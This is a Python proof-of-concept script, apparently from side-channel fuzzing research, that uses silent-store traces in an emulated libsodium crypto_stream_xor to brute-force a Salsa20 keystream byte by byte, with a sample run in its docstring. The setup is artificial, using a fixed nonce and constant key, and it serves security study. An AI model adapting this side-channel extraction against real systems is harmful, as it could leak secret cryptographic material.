#!/usr/bin/env python3
"""
david.mateos@AF-519:~/pandora_fuzzing_dev/revizor$ time ./src/attack_stream_xor_ssi.py
Real keystream: c085fdc0ef497accd77c561f4243d91e

c0
c085
c085fd
c085fdc0
c085fdc0ef
c085fdc0ef49
c085fdc0ef497a
c085fdc0ef497acc
c085fdc0ef497accd7
c085fdc0ef497accd77c
c085fdc0ef497accd77c56
c085fdc0ef497accd77c561f
c085fdc0ef497accd77c561f42
c085fdc0ef497accd77c561f4243
c085fdc0ef497accd77c561f4243d9
c085fdc0ef497accd77c561f4243d91e

Recovered keystream: c085fdc0ef497accd77c561f4243d91e


real    1m32,634s
user    1m2,867s
sys     0m3,709s
"""

import ctypes
import time
from attack_common import check_correct_file
from model import SilentStoreTracer, X86UnicornModel
from input_generator import StreamXorInputGenerator, Input
from interfaces import RawTrace

NONCE_LENGTH = 24
KEY_LENGTH = 32

class Service:
	"""
	This models a service that ciphers something with crypto_stream_xor using a secret key
	and fixed nonce, but keeps the result secret. It assumes the attacker can cipher an
	arbitrary message and observe silent stores with trace(). The attacker's goal is to
	leak the keystream its messages are ciphered with.
	Note in real world nonce should be unique per encryption, so this attack woudln't work.
	Also, leaking the keystream is probably not very useful.
	"""
	def __init__(self):
		self.nonce = b"B"*NONCE_LENGTH
		self.key = b"C"*KEY_LENGTH

		self.model = X86UnicornModel("targets/libsodium", "crypto_stream_xor")
		self.model.tracer = SilentStoreTracer(None)
		self.input_gen = StreamXorInputGenerator(self.model.STACK, self.model.STACK_SIZE)
		self.input_gen.IN_PLACE = False

	def trace(self, message: bytes) -> RawTrace:
		input_ = self.input_gen.create_input(message, self.key, self.nonce)
		trace, _ = self.model.trace_test_case(input_)
		return trace.trace

	def get_keystream(self, length) -> bytes:
		c = ctypes.CDLL("targets/libsodium.so")
		cipher = ctypes.create_string_buffer(length)
		message = bytes(length)
		c.crypto_stream_xor(cipher, message, length, self.nonce, self.key)
		return bytes(cipher)


def main():
	check_correct_file("targets/libsodium")
	service = Service()

	keystream_length = 16
	assert keystream_length < 64
	keystream = service.get_keystream(keystream_length)
	print(f"Real keystream: {keystream.hex()}\n")

	def n_correct_bytes(keystream):
		trace = service.trace(keystream)
		pcs = [int(observation, 16) for observation in trace]
		return pcs.count(0x4069cd) # store at https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/crypto_stream/salsa20/ref/salsa20_ref.c#L105
	keystream = bytes()
	assert n_correct_bytes(keystream) == 0

	while len(keystream) < keystream_length:
		for b in range(256):
			b = bytes([b])
			n = n_correct_bytes(keystream + b)
			if n > len(keystream):
				assert n == len(keystream) + 1
				keystream += b
				print(keystream.hex())
				break
		else:
			raise Exception(f"Failed to bruteforce byte {len(keystream)}")

	print(f"\nRecovered keystream: {keystream.hex()}\n")






	# inputs = input_gen.generate(100)
	# for input_ in inputs:
	# 	trace, _ = model.trace_test_case(input_)
	# 	print([hex(t) for t in trace], number_of_silent_stores(input_))

if __name__ == "__main__":
	main()